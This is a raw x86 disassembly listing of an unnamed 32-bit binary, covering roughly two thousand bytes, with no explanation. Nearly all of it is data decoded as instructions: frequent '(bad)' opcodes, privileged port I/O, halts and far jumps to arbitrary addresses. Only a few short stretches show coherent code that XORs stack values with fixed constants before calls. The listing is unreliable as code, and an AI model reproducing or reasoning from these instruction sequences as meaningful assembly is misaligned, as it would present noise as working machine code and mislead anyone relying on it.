  4214d5:	fmulp  st(5),st
  4214d7:	gs int3 
  4214d9:	xchg   ebx,eax
  4214da:	dec    edi
  4214db:	sub    DWORD PTR [ebx],edi
  4214dd:	add    DWORD PTR [eax-0x61],0x2
  4214e1:	mov    bh,0x96
  4214e3:	(bad)  
  4214e4:	je     0x4214e7
  4214e6:	adc    BYTE PTR [edx],bh
  4214e8:	sub    DWORD PTR [ebp-0x74],0x6e21d88d
  4214ef:	loop   0x42152f
  4214f1:	test   ch,al
  4214f3:	pop    ebp
  4214f4:	hlt    
  4214f5:	aaa    
  4214f6:	jo     0x42147e
  4214f8:	mov    ebx,0xbb87f88c
  4214fd:	xchg   esp,eax
  4214fe:	lahf   
  4214ff:	ins    BYTE PTR es:[edi],dx
  421500:	jl     0x42153d
  421502:	fcomp  st(4)
  421504:	(bad)  
  421505:	mov    edi,0xabdf9dd1
  42150a:	push   edx
  42150b:	dec    ecx
  42150c:	js     0x4214a8
  42150e:	dec    esi
  42150f:	neg    BYTE PTR [edx]
  421511:	inc    edi
  421512:	cli    
  421513:	rcl    eax,0xb3
  421516:	out    dx,eax
  421517:	or     al,0x34
  421519:	arpl   WORD PTR [esi-0x5db149ea],sp
  42151f:	in     eax,dx
  421520:	dec    eax
  421521:	dec    eax
  421522:	jo     0x42155f
  421524:	call   0x86e6:0x44be4ac4
  42152b:	jo     0x42158b
  42152d:	xchg   BYTE PTR ds:0x1f1695ce,bl
  421533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421534:	and    DWORD PTR ds:0xeb2e8c36,eax
  42153a:	xchg   esp,eax
  42153b:	aaa    
  42153c:	test   al,0x6d
  42153e:	inc    esp
  42153f:	push   edi
  421540:	cmp    DWORD PTR [ecx-0x6ae06294],edi
  421546:	out    0x89,al
  421548:	retf   0xaf6f
  42154b:	inc    edi
  42154c:	add    eax,0xd89f5234
  421551:	push   ss
  421552:	push   ecx
  421553:	aam    0xfd
  421555:	ins    BYTE PTR es:[edi],dx
  421556:	test   al,0x97
  421559:	adc    BYTE PTR [ebx+0x4],0xf4
  42155d:	in     al,0xb2
  42155f:	sbb    DWORD PTR [eax],esi
  421561:	inc    ecx
  421562:	popf   
  421563:	xlat   BYTE PTR ds:[ebx]
  421564:	(bad)  
  421565:	out    dx,al
  421566:	popa   
  421567:	mov    gs,WORD PTR [ecx-0x4f37fb94]
  42156d:	or     dl,BYTE PTR [ebp+ebp*4+0x37befec6]
  421574:	in     eax,dx
  421575:	std    
  421576:	sub    bl,ah
  421578:	repnz loop 0x421589
  42157b:	cdq    
  42157c:	test   al,0xfe
  42157e:	push   ss
  42157f:	jno    0x421564
  421581:	lods   al,BYTE PTR ds:[esi]
  421582:	fwait
  421583:	jae    0x421573
  421585:	shr    DWORD PTR [esi+0x8f77bea],cl
  42158b:	pop    es
  42158c:	fist   DWORD PTR [eax+0x57ac9da7]
  421592:	lahf   
  421593:	adc    eax,0xae73a8e7
  421598:	or     bh,bh
  42159a:	sar    BYTE PTR ds:[esi-0x22],1
  42159e:	test   eax,0xe23a1651
  4215a3:	pushf  
  4215a4:	jl     0x42153a
  4215a6:	lods   eax,DWORD PTR ds:[esi]
  4215a7:	bswap  edi
  4215a9:	dec    edi
  4215aa:	or     DWORD PTR [esp+eax*4],ecx
  4215ad:	cdq    
  4215ae:	fidiv  WORD PTR [esi-0x6eb0fecb]
  4215b4:	ret    0x913b
  4215b7:	sbb    al,0xed
  4215b9:	lods   al,BYTE PTR ds:[esi]
  4215ba:	xchg   ecx,eax
  4215bb:	stc    
  4215bc:	nop
  4215bd:	in     eax,dx
  4215be:	mov    ebp,DWORD PTR ds:0xda05d02d
  4215c4:	jecxz  0x4215a1
  4215c6:	or     al,0xe7
  4215c8:	mov    dh,0xe2
  4215ca:	mov    bl,0x17
  4215cc:	out    dx,eax
  4215cd:	xchg   ebp,eax
  4215ce:	push   esi
  4215cf:	jle    0x4215ed
  4215d1:	or     bh,BYTE PTR [edi+0x6f]
  4215d4:	mov    dh,0xf6
  4215d6:	dec    ebp
  4215d7:	loop   0x4215b1
  4215d9:	inc    esi
  4215da:	mov    dl,0x30
  4215dc:	pop    edx
  4215dd:	and    DWORD PTR [esi-0x20d0d7bf],0xffffffcf
  4215e4:	fimul  WORD PTR [esi]
  4215e6:	data16 cs mov dl,0xeb
  4215ea:	pop    ecx
  4215eb:	mov    eax,0x51cfbe9a
  4215f0:	(bad)  
  4215f1:	stos   DWORD PTR es:[edi],eax
  4215f2:	arpl   ax,cx
  4215f4:	inc    eax
  4215f5:	repnz loop 0x4215b0
  4215f8:	sbb    eax,0xfefef08b
  4215fd:	pop    ss
  4215fe:	std    
  4215ff:	ss inc esi
  421601:	cmp    al,0x43
  421603:	xor    dl,ch
  421605:	loop   0x421630
  421607:	leave  
  421608:	mov    ebx,0x147904a
  42160d:	sbb    DWORD PTR [edx+0x6688db06],esp
  421613:	push   ds
  421614:	push   edi
  421615:	cmp    eax,0x20556e39
  42161a:	shl    BYTE PTR [edx+0x39],cl
  42161d:	mov    al,ds:0x2b6aae9c
  421622:	jl     0x421654
  421624:	jg     0x42169a
  421626:	pop    es
  421627:	fs aad 0x5b
  42162a:	inc    ebx
  42162b:	cmp    ecx,DWORD PTR [edx+0x40]
  42162e:	ds jo  0x421646
  421631:	mov    bl,0x84
  421633:	add    eax,0xe8eca663
  421638:	sbb    al,0xa1
  42163a:	in     al,dx
  42163b:	imul   ebp
  42163d:	pop    edi
  42163e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42163f:	mov    eax,ds:0x2bdfc85b
  421644:	and    al,0x90
  421646:	jb     0x421654
  421648:	pop    ecx
  421649:	mov    ebx,0xa84f400b
  42164e:	sar    DWORD PTR [ebx+edi*8-0x9],1
  421652:	call   0x2419344a
  421657:	js     0x421686
  421659:	sti    
  42165a:	sbb    DWORD PTR [eax],edi
  42165c:	xchg   edx,eax
  42165d:	pop    eax
  42165e:	not    DWORD PTR [edx-0x3688d08e]
  421664:	mov    al,ds:0x92c4293b
  421669:	mov    ah,BYTE PTR fs:[esi+0x62644626]
  421670:	pop    esi
  421671:	and    ah,ch
  421673:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421674:	gs inc ecx
  421676:	hlt    
  421677:	(bad)  
  421678:	out    dx,al
  421679:	outs   dx,BYTE PTR ds:[esi]
  42167a:	push   ds
  42167b:	jp     0x421617
  42167d:	lahf   
  42167e:	jl     0x4216af
  421680:	shl    BYTE PTR [eax],cl
  421682:	shr    DWORD PTR [edi],1
  421684:	add    dl,cl
  421686:	icebp  
  421687:	ja     0x4216ff
  421689:	lods   eax,DWORD PTR ds:[esi]
  42168a:	ret    
  42168b:	dec    edx
  42168c:	leave  
  42168d:	mov    ds,edi
  42168f:	dec    BYTE PTR [edi+0x4b02f48a]
  421695:	je     0x4216f7
  421697:	add    eax,0x691fbd4d
  42169c:	outs   dx,BYTE PTR ds:[esi]
  42169d:	mov    ah,0x65
  42169f:	sub    BYTE PTR [eax-0x22],cl
  4216a2:	inc    ecx
  4216a3:	ss out dx,al
  4216a5:	inc    esp
  4216a6:	in     al,dx
  4216a7:	mov    esp,0x38b4081f
  4216ac:	jmp    0xf8bf:0x894269cb
  4216b3:	sub    DWORD PTR [ebx],0x61
  4216b6:	jns    0x42169b
  4216b8:	cmc    
  4216b9:	ds out dx,al
  4216bb:	mov    dh,0xd3
  4216bd:	rol    BYTE PTR [eax],cl
  4216bf:	pop    esp
  4216c0:	inc    edx
  4216c1:	gs xchg edi,eax
  4216c4:	sbb    eax,0x447ba65a
  4216c9:	jecxz  0x4216ec
  4216cb:	in     al,dx
  4216cc:	cdq    
  4216cd:	les    ecx,FWORD PTR [ebp+0x7f]
  4216d0:	jmp    0x722724fe
  4216d5:	mov    ds:0x652bbd81,al
  4216da:	call   0x4b75e6e0
  4216df:	pop    ebx
  4216e0:	mov    dl,BYTE PTR [esi-0xd]
  4216e3:	mov    esi,0xd36aca5a
  4216e8:	xchg   edx,eax
  4216e9:	addr16 xor eax,esp
  4216ec:	jmp    0x421681
  4216ee:	lock sub BYTE PTR [edx-0x5d],al
  4216f2:	mov    esi,0xb7378692
  4216f7:	pop    ds
  4216f8:	ret    
  4216f9:	push   cs
  4216fa:	ins    DWORD PTR es:[edi],dx
  4216fb:	lea    esi,[edx-0x2636cb5c]
  421701:	(bad)  
  421702:	fdivr  DWORD PTR [ebx]
  421704:	mov    al,0x41
  421706:	or     dh,BYTE PTR [eax-0x5]
  421709:	sbb    dh,BYTE PTR [eax+0x49]
  42170c:	dec    edi
  42170d:	mov    ds:0x17d39c39,eax
  421712:	dec    esi
  421713:	adc    eax,0xaffc67a9
  421718:	inc    edi
  421719:	int3   
  42171a:	sbb    eax,0x53756c9d
  42171f:	and    BYTE PTR [edx+0x44b8f8f6],0x69
  421726:	xor    dl,BYTE PTR [ecx+0x27304fb]
  42172c:	adc    esp,DWORD PTR [edi]
  42172e:	out    dx,eax
  42172f:	(bad)  
  421730:	mov    esp,0x8e669d3d
  421735:	lea    ecx,[edi]
  421737:	hlt    
  421738:	cmp    DWORD PTR [esi],esp
  42173a:	and    BYTE PTR [edi-0x31d7096e],0x6c
  421741:	xor    al,0xdb
  421743:	and    ebx,esp
  421745:	adc    ecx,DWORD PTR [esp+ecx*8+0x3ffa530e]
  42174c:	repz xor esi,DWORD PTR [ecx+0x5b09fe5]
  421753:	pop    edx
  421754:	sbb    DWORD PTR [esi-0x40],edi
  421757:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421758:	mov    ah,0xe3
  42175a:	pop    ds
  42175b:	call   FWORD PTR [ebp-0x33b490cc]
  421761:	push   ss
  421762:	sub    dl,ch
  421764:	xchg   ebx,eax
  421765:	dec    esi
  421766:	mov    ds:0xca652dbd,al
  42176b:	and    ah,BYTE PTR gs:[edx-0x4c3b870b]
  421772:	adc    eax,0xe71110b8
  421777:	and    eax,0x6839431f
  42177c:	es inc ebp
  42177e:	lods   al,BYTE PTR ds:[esi]
  42177f:	push   esi
  421780:	pop    ds
  421781:	cld    
  421782:	je     0x4217c0
  421784:	or     eax,0x344418a8
  421789:	nop
  42178a:	scas   eax,DWORD PTR es:[edi]
  42178b:	inc    ecx
  42178c:	mov    DWORD PTR [edi-0x3c3bb5cf],edi
  421792:	lock dec esi
  421794:	mov    dl,0xfd
  421796:	push   ss
  421797:	add    ecx,edi
  421799:	cdq    
  42179a:	add    al,0x6f
  42179c:	sub    DWORD PTR [eax+0x6982cc4],0xffffffc4
  4217a3:	aaa    
  4217a4:	in     eax,0x3
  4217a6:	mov    dl,0x61
  4217a8:	std    
  4217a9:	mov    ch,0x12
  4217ab:	dec    ecx
  4217ac:	xchg   ebx,eax
  4217ad:	lock add eax,0xb0d518ed
  4217b3:	in     al,0xf5
  4217b5:	fimul  WORD PTR [eax]
  4217b7:	xchg   esp,eax
  4217b8:	push   eax
  4217b9:	pushf  
  4217ba:	pop    esi
  4217bb:	test   al,0x7d
  4217bd:	clc    
  4217be:	jg     0x421770
  4217c0:	sbb    bh,BYTE PTR [ebp+0x2a]
  4217c3:	dec    ecx
  4217c4:	inc    ebx
  4217c5:	dec    edi
  4217c6:	pop    eax
  4217c7:	(bad)  
  4217c9:	pop    esi
  4217ca:	test   DWORD PTR [edx+0x7485a076],ebp
  4217d0:	jno    0x421828
  4217d2:	adc    ebx,0xba88d45a
  4217d8:	mov    bl,0x7e
  4217da:	push   0x14
  4217dc:	xor    eax,0x48a0a12e
  4217e1:	jb     0x421857
  4217e3:	imul   ebx,DWORD PTR [ebx+eiz*2+0x244b427c],0x40e39db3
  4217ee:	cld    
  4217ef:	fidivr WORD PTR [edi-0x3ddd7a56]
  4217f5:	jl     0x42178b
  4217f7:	ret    
  4217f8:	fsub   DWORD PTR [edi-0x217973df]
  4217fe:	outs   dx,DWORD PTR ds:[esi]
  4217ff:	jle    0x421794
  421801:	sbb    ecx,edi
  421803:	sbb    esp,DWORD PTR [ebp-0x5001535e]
  421809:	mov    al,ds:0x1436df63
  42180e:	push   ecx
  42180f:	addr16 sti 
  421811:	push   es
  421812:	test   ah,dh
  421814:	inc    bp
  421816:	rol    DWORD PTR [ebp-0x5a60b510],0xe7
  42181d:	xor    ecx,DWORD PTR [ebx]
  42181f:	test   DWORD PTR [ecx-0x3fcd151],edx
  421825:	cmp    cl,bl
  421827:	dec    ebx
  421828:	and    DWORD PTR [edx-0x7a],esp
  42182b:	mov    bh,0xe4
  42182d:	add    ch,BYTE PTR [edx]
  42182f:	jmp    0x421874
  421831:	push   ebx
  421832:	jecxz  0x42184c
  421834:	in     al,dx
  421835:	cmp    eax,0x92a8f329
  42183a:	mov    eax,ds:0xa6cd6bb6
  42183f:	retw   0x1c11
  421843:	xor    eax,0x4707dbc8
  421848:	pop    ecx
  421849:	popf   
  42184a:	add    ebx,eax
  42184c:	jmp    0x8b6d:0x8a0f986a
  421853:	xchg   ebp,eax
  421854:	adc    al,0xfe
  421856:	(bad)  
  421857:	push   DWORD PTR ds:0xcb79b576
  42185d:	xor    edx,0x9c2b8ae8
  421863:	mov    cl,0x3e
  421865:	call   0x42241b
  42186a:	or     esi,eax
  42186c:	or     edi,edx
  42186e:	mov    DWORD PTR [ebp-0x1f8],esi
  421874:	jmp    0x421cb0
  421879:	mov    eax,DWORD PTR [ebp-0x1e0]
  42187f:	mov    edx,DWORD PTR [ebp-0x1dc]
  421885:	xor    eax,0xcb79b576
  42188a:	xor    edx,0x9c2b8ae8
  421890:	mov    cl,0x2
  421892:	call   0x408bb8
  421897:	mov    esi,eax
  421899:	mov    edi,edx
  42189b:	mov    eax,DWORD PTR [ebp-0x1e0]
  4218a1:	mov    edx,DWORD PTR [ebp-0x1dc]
  4218a7:	xor    eax,0xcb79b576
  4218ac:	xor    edx,0x9c2b8ae8
  4218b2:	mov    cl,0x3e
  4218b4:	call   0x42241b
  4218b9:	or     esi,eax
  4218bb:	or     edi,edx
  4218bd:	jmp    0x421ca4
  4218c2:	sbb    bh,BYTE PTR [esi]
  4218c4:	shr    DWORD PTR [edx+0x6ebaba9a],1
  4218ca:	daa    
  4218cb:	xchg   DWORD PTR [eax-0x2f],ebp
  4218ce:	aas    
  4218cf:	pop    eax
  4218d0:	fninit 
  4218d2:	lods   al,BYTE PTR ds:[esi]
  4218d3:	rol    eax,0xbe
  4218d6:	dec    edx
  4218d7:	les    edi,FWORD PTR [esi+0x2f120ebe]
  4218dd:	xchg   esp,eax
  4218de:	sar    DWORD PTR [edx+0x7795b241],0x9b
  4218e5:	push   esp
  4218e6:	loop   0x421876
  4218e8:	xor    al,0xca
  4218ea:	ret    
  4218eb:	cli    
  4218ec:	inc    ebp
  4218ed:	pushf  
  4218ee:	sub    al,0x8e
  4218f0:	ret    
  4218f1:	iret   
  4218f2:	push   esi
  4218f3:	bound  edx,QWORD PTR [ebp-0x12]
  4218f6:	and    BYTE PTR [ebp+0x180e6740],dh
  4218fc:	mov    dl,0xaf
  4218fe:	(bad)  
  4218ff:	jmp    0xacdb54b6
  421904:	add    DWORD PTR [ecx-0x1d25b9fb],ebp
  42190a:	jbe    0x4218b6
  42190c:	aad    0xcd
  42190e:	fild   QWORD PTR ds:0xe1158426
  421914:	xchg   esp,eax
  421915:	iret   
  421916:	mov    dh,0xb1
  421918:	dec    edx
  421919:	test   BYTE PTR [eax-0x31],dl
  42191c:	adc    esi,edi
  42191e:	xor    eax,0xa536fd28
  421923:	mov    ebx,edx
  421925:	or     DWORD PTR [esi+0x1],ebx
  421928:	push   ds
  421929:	dec    esi
  42192a:	addr16 adc cl,bl
  42192d:	mov    ds:0xdd60aca7,eax
  421932:	jns    0x421968
  421934:	or     DWORD PTR [eax+0x41],ebp
  421937:	shl    BYTE PTR [edx],1
  421939:	ins    DWORD PTR es:[edi],dx
  42193a:	stos   BYTE PTR es:[edi],al
  42193b:	add    eax,0xffffffc4
  42193e:	aam    0xf0
  421940:	in     eax,0xa1
  421942:	out    dx,eax
  421943:	jo     0x42199f
  421945:	jmp    0xe1e83cc2
  42194a:	icebp  
  42194b:	mov    edx,0x9b8ca6e4
  421950:	push   0xb08518e5
  421955:	sub    al,0x85
  421957:	ins    BYTE PTR es:[edi],dx
  421958:	sbb    DWORD PTR [ecx-0x67],eax
  42195b:	jb     0x4219d8
  42195d:	add    eax,0x18f6f12f
  421962:	dec    BYTE PTR ds:0xcda78a1a
  421968:	(bad)  
  421969:	test   DWORD PTR gs:[ebx-0x23772a5c],ebx
  421970:	mov    ebp,0x6b800484
  421975:	or     BYTE PTR [ebx-0x5],0x96
  421979:	mov    esi,ecx
  42197b:	js     0x4219a0
  42197d:	sub    bh,al
  42197f:	xchg   ecx,eax
  421980:	aaa    
  421981:	ss icebp 
  421983:	iret   
  421984:	popa   
  421985:	jg     0x42194e
  421987:	fdiv   QWORD PTR [ecx-0x41]
  42198a:	arpl   WORD PTR es:[edi+ecx*1-0x4514e4d],cx
  421992:	(bad)  
  421993:	fnstcw WORD PTR [ebx+0x2dac1e3b]
  421999:	int    0xcc
  42199b:	adc    BYTE PTR [ebx],dh
  42199d:	xchg   edi,eax
  42199e:	adc    dl,BYTE PTR [ebp+0x71]
  4219a1:	outs   dx,BYTE PTR ds:[esi]
  4219a2:	ret    
  4219a3:	jecxz  0x42192a
  4219a5:	adc    eax,0x9b0dc8fa
  4219aa:	out    0xd9,al
  4219ac:	pop    es
  4219ad:	jecxz  0x4219bf
  4219af:	and    BYTE PTR [esi+0x3c],ah
  4219b2:	jmp    0x4219c0
  4219b4:	bound  edi,QWORD PTR [edx+0x5d]
  4219b7:	or     ebx,DWORD PTR [edi-0x66729a43]
  4219bd:	in     al,0xbf
  4219bf:	cmp    al,0xe7
  4219c1:	or     eax,0xefd68071
  4219c6:	fnstsw WORD PTR ds:0x88db3479
  4219cc:	test   edi,edi
  4219ce:	adc    eax,0x19c14f9
  4219d3:	arpl   bp,bp
  4219d5:	add    BYTE PTR [ecx-0x4],ch
  4219d8:	mov    dl,0x2
  4219da:	test   al,0x7
  4219dc:	call   0xd6a37eaf
  4219e1:	xor    DWORD PTR [eax+eax*4],edi
  4219e4:	pushf  
  4219e5:	push   esp
  4219e6:	ja     0x42199b
  4219e8:	int    0x35
  4219ea:	push   esp
  4219eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219ec:	fbld   TBYTE PTR [edi+0x303236fe]
  4219f2:	rdtsc  
  4219f4:	jp     0x4219c1
  4219f6:	inc    bp
  4219f8:	ds push esp
  4219fa:	and    eax,ecx
  4219fc:	fstp   DWORD PTR [edx]
  4219fe:	pop    ecx
  4219ff:	add    eax,0xb1bacb1e
  421a04:	(bad)  
  421a06:	shr    BYTE PTR [edi],0x8a
  421a09:	out    0x38,al
  421a0b:	jp     0x4219d8
  421a0d:	mov    ebp,0xd3fd573a
  421a12:	jp     0x4219d5
  421a14:	push   ebp
  421a15:	push   ss
  421a16:	push   eax
  421a17:	ins    BYTE PTR es:[edi],dx
  421a18:	in     eax,dx
  421a19:	adc    DWORD PTR [ecx-0x6b],0xf73f751
  421a20:	xchg   esp,eax
  421a21:	xchg   ebp,eax
  421a22:	lahf   
  421a23:	rcl    BYTE PTR [ebp+0xd],cl
  421a26:	test   al,0xf4
  421a28:	push   ss
  421a29:	out    0xe2,eax
  421a2b:	xchg   DWORD PTR [esi-0x5e],ebx
  421a2e:	cmp    al,0x3d
  421a30:	es jg  0x421a7e
  421a33:	pop    edx
  421a34:	lahf   
  421a35:	scas   eax,DWORD PTR es:[edi]
  421a36:	rol    BYTE PTR [edi-0x4573cbb5],0xa
  421a3d:	ret    0x1dbe
  421a40:	gs (bad) 
  421a42:	xchg   edx,eax
  421a43:	in     eax,0x88
  421a45:	test   BYTE PTR [ebx],cl
  421a47:	ds and eax,edx
  421a4a:	push   ss
  421a4b:	imul   ebx,DWORD PTR [edx+eax*1+0x2cca173e],0x29
  421a53:	add    bh,al
  421a55:	push   ecx
  421a56:	cmc    
  421a57:	(bad)
  421a5a:	push   eax
  421a5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a5c:	out    dx,eax
  421a5d:	ret    
  421a5e:	jmp    0x421a45
  421a60:	lds    edx,FWORD PTR [ecx+ebp*1]
  421a63:	cli    
  421a64:	add    edx,eax
  421a66:	sub    ah,dl
  421a68:	das    
  421a69:	cmp    bl,ch
  421a6b:	(bad)  
  421a6c:	fstp   QWORD PTR [edi-0x5b652d70]
  421a72:	pusha  
  421a73:	sbb    eax,0x2a5b9356
  421a78:	xor    dl,BYTE PTR [edx-0x26]
  421a7b:	mov    cl,0xff
  421a7d:	add    al,0x0
  421a7f:	test   esp,ebp
  421a81:	scas   al,BYTE PTR es:[edi]
  421a82:	sbb    al,0x2d
  421a84:	mov    al,0x24
  421a86:	push   ecx
  421a87:	ja     0x421a81
  421a89:	pop    edi
  421a8a:	ror    BYTE PTR [ebp-0x6283f682],cl
  421a90:	into   
  421a91:	repz add ebp,esi
  421a94:	sbb    al,0xe1
  421a96:	or     eax,0x55799909
  421a9b:	and    eax,0xb046d43d
  421aa0:	mov    DWORD PTR [ebx],ecx
  421aa2:	push   edx
  421aa3:	adc    BYTE PTR [ecx+0x1a5c43d7],al
  421aa9:	sub    DWORD PTR [ebx+eiz*1],0x64
  421aad:	cs scas al,BYTE PTR es:[edi]
  421aaf:	push   edi
  421ab0:	xor    eax,0x85094658
  421ab5:	mov    BYTE PTR [eax+0x32],bl
  421ab8:	push   ebx
  421ab9:	jo     0x421a86
  421abb:	int    0x16
  421abd:	adc    al,0x0
  421abf:	xlat   BYTE PTR ds:[ebx]
  421ac0:	nop
  421ac1:	int    0x9f
  421ac3:	aad    0x35
  421ac5:	shl    BYTE PTR ds:0xf4d8bd60,1
  421acb:	inc    ebx
  421acc:	adc    al,0xfa
  421ace:	or     al,0x5e
  421ad0:	retf   0x51bf
  421ad3:	jecxz  0x421acd
  421ad5:	add    BYTE PTR [edx+0x7c],dl
  421ad8:	je     0x421b32
  421ada:	push   edi
  421adb:	in     eax,dx
  421adc:	sub    ebx,DWORD PTR [esi+esi*4+0x31]
  421ae0:	int    0xe5
  421ae2:	mov    ebp,0xeb9415a8
  421ae7:	pushf  
  421ae8:	leave  
  421ae9:	cmp    eax,0x5d5397a1
  421aee:	dec    ebp
  421aef:	push   cs
  421af0:	mov    bl,0x88
  421af2:	out    0xe,eax
  421af4:	inc    ebp
  421af5:	pop    esi
  421af6:	scas   eax,DWORD PTR es:[edi]
  421af7:	cmp    dh,BYTE PTR [eax+0x616672a8]
  421afd:	repz xor dl,BYTE PTR [eax+0x633051ee]
  421b04:	shl    DWORD PTR gs:0x21e6fb60,cl
  421b0b:	mov    esp,0xed81077
  421b10:	or     DWORD PTR [ebx-0x59],esi
  421b13:	pushf  
  421b14:	ins    BYTE PTR es:[edi],dx
  421b15:	mov    bh,0xc8
  421b17:	sbb    ebx,edx
  421b19:	(bad)  
  421b1a:	sbb    DWORD PTR [eax-0x3ee96d3d],ebp
  421b20:	ret    0x959d
  421b23:	push   esi
  421b24:	outs   dx,DWORD PTR ds:[esi]
  421b25:	ret    0x4d87
  421b28:	not    DWORD PTR [eax-0x43]
  421b2b:	adc    BYTE PTR [eax-0x2285b282],al
  421b31:	pop    ds
  421b32:	call   DWORD PTR [esp+esi*4-0x37]
  421b36:	pusha  
  421b37:	cmp    ebp,DWORD PTR [esi+0x15]
  421b3a:	mov    ds:0x2b6fdd5f,al
  421b3f:	shl    dl,0x1e
  421b42:	or     ebx,eax
  421b44:	push   esp
  421b45:	lods   al,BYTE PTR gs:[esi]
  421b47:	add    eax,0x5bb9a26c
  421b4c:	(bad)  
  421b4e:	out    dx,al
  421b4f:	add    al,0xf4
  421b51:	jae    0x421ae2
  421b53:	push   esp
  421b54:	push   si
  421b56:	jp     0x421b4b
  421b58:	out    dx,al
  421b59:	setne  bh
  421b5c:	inc    esp
  421b5d:	push   ebp
  421b5e:	test   al,0x11
  421b60:	popa   
  421b61:	ds jb  0x421b49
  421b64:	bound  ebp,QWORD PTR [edx+0xe]
  421b67:	int    0x6a
  421b69:	cli    
  421b6a:	hlt    
  421b6b:	add    al,0x68
  421b6d:	shl    DWORD PTR [eax],cl
  421b6f:	sbb    BYTE PTR [ebp+0x33],0xaf
  421b73:	add    DWORD PTR [ebp+0x4db62eb1],esi
  421b79:	and    al,0x12
  421b7b:	jecxz  0x421b7b
  421b7d:	int3   
  421b7e:	cwde   
  421b7f:	sar    BYTE PTR [edi+esi*8-0x16],cl
  421b83:	out    0x66,al
  421b85:	mov    al,ds:0x508abfcf
  421b8a:	rol    eax,1
  421b8c:	ins    DWORD PTR es:[edi],dx
  421b8d:	frstor [edx-0xfc56068]
  421b93:	xchg   esi,eax
  421b94:	sbb    dh,BYTE PTR [esi-0x40]
  421b97:	pushf  
  421b98:	gs das 
  421b9a:	shr    BYTE PTR [edi],0x4b
  421b9d:	xchg   DWORD PTR [esi+0x67498964],esi
  421ba3:	mov    dh,0x2
  421ba5:	(bad)  
  421ba6:	pop    eax
  421ba7:	jecxz  0x421b5c
  421ba9:	out    0x71,eax
  421bab:	push   es
  421bac:	push   0xcb1e744d
  421bb1:	jbe    0x421bb1
  421bb3:	or     ch,dh
  421bb5:	cmp    eax,eax
  421bb7:	lods   eax,DWORD PTR ds:[esi]
  421bb8:	ret    
  421bb9:	push   0x28
  421bbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bbc:	ret    0x723c
  421bbf:	mov    esi,0x787caac4
  421bc4:	add    bl,BYTE PTR [ecx-0x29]
  421bc7:	std    
  421bc8:	add    DWORD PTR [ebx-0x41],esi
  421bcb:	jne    0x421c18
  421bcd:	mov    bl,0x4f
  421bcf:	hlt    
  421bd0:	out    dx,eax
  421bd1:	fidiv  DWORD PTR [esi-0x10]
  421bd4:	and    DWORD PTR [esi-0x9],esp
  421bd7:	shl    ebp,cl
  421bd9:	push   ebp
  421bda:	push   edx
  421bdb:	push   cs
  421bdc:	xor    BYTE PTR [ebp-0x67e56a99],bl
  421be2:	dec    BYTE PTR [ebx-0x2bb822e2]
  421be8:	pop    eax
  421be9:	fst    DWORD PTR [esi+ebx*1+0x4]
  421bed:	add    al,0x15
  421bef:	push   0x50c4c970
  421bf4:	inc    esi
  421bf5:	push   esi
  421bf6:	enter  0x6377,0xb3
  421bfa:	iret   
  421bfb:	and    dl,al
  421bfd:	shl    BYTE PTR [edi],1
  421bff:	fisubr WORD PTR [ecx-0x45]
  421c02:	mov    edx,0x2c39997d
  421c07:	aas    
  421c08:	fld    QWORD PTR [esi]
  421c0a:	push   ds
  421c0b:	dec    ebx
  421c0c:	push   cs
  421c0d:	aas    
  421c0e:	jae    0x421c89
  421c10:	es repz pop ecx
  421c13:	daa    
  421c14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c15:	push   es
  421c16:	xor    BYTE PTR [esi-0x7f],dh
  421c19:	popa   
  421c1a:	and    DWORD PTR [esi-0x49025ee4],ecx
  421c20:	in     al,0xdf
  421c22:	aad    0x24
  421c24:	iret   
  421c25:	cmp    ecx,ebx
  421c27:	jmp    0xdd3a:0xdf1b33a7
  421c2e:	mov    DWORD PTR [edi+0x3476c2cf],ecx
  421c34:	test   eax,0xd4b36a20
  421c39:	xlat   BYTE PTR ds:[ebx]
  421c3a:	pop    ebx
  421c3b:	fstp   st(1)
  421c3d:	leave  
  421c3e:	out    dx,al
  421c3f:	mov    cl,0x79
  421c41:	neg    BYTE PTR [ebp-0x5f]
  421c44:	or     edx,DWORD PTR [ebp-0x35d76d17]
  421c4a:	dec    ecx
  421c4b:	mov    esi,0xcdd65298
  421c50:	es mov eax,0xab249fd0
  421c56:	cmp    DWORD PTR [ebp+0x3a],esp
  421c59:	ss je  0x421cc6
  421c5c:	push   ebx
  421c5d:	or     DWORD PTR [edi+0x7483b2d4],esi
  421c63:	sub    al,0x16
  421c65:	jno    0x421c2e
  421c67:	loop   0x421ca2
  421c69:	inc    edx
  421c6a:	add    BYTE PTR [edx-0x66],0xc4
  421c6e:	xor    al,0xf1
  421c70:	xor    eax,0x463716b0
  421c75:	or     DWORD PTR ds:0xcbf3e746,ebx
  421c7b:	(bad)  
  421c7c:	mul    BYTE PTR [edx]
  421c7e:	jno    0x421c17
  421c80:	inc    ebx
  421c81:	pop    edi
  421c82:	mov    ecx,0xfe246a28
  421c87:	in     al,dx
  421c88:	mov    WORD PTR ds:0x850a399b,ss
  421c8e:	aas    
  421c8f:	in     eax,dx
  421c90:	inc    ebp
  421c91:	mov    ecx,0xa2eb56e0
  421c96:	neg    DWORD PTR [edx]
  421c98:	cli    
  421c99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c9a:	retf   
  421c9b:	mov    ebp,0x3faa64df
  421ca0:	loope  0x421c36
  421ca2:	mov    eax,ds:0x8b50353
  421ca7:	(bad)  
  421ca8:	(bad)  
  421ca9:	dec    DWORD PTR [ecx-0x1f74b]
  421caf:	dec    DWORD PTR [ebx-0x1e77b]
  421cb5:	(bad)  
  421cb6:	cmp    DWORD PTR [ebp-0x1f8],eax
  421cbc:	je     0x421e4c
  421cc2:	mov    eax,DWORD PTR [ebp-0x1f8]
  421cc8:	mov    ecx,DWORD PTR [ebp-0x20c]
  421cce:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  421cd3:	xor    eax,0xa59b
  421cd8:	movzx  eax,ax
  421cdb:	sar    eax,1
  421cdd:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421ce3:	mov    edx,DWORD PTR [ebp-0x20c]
  421ce9:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  421cee:	xor    ecx,0xa59b
  421cf4:	movzx  ecx,cx
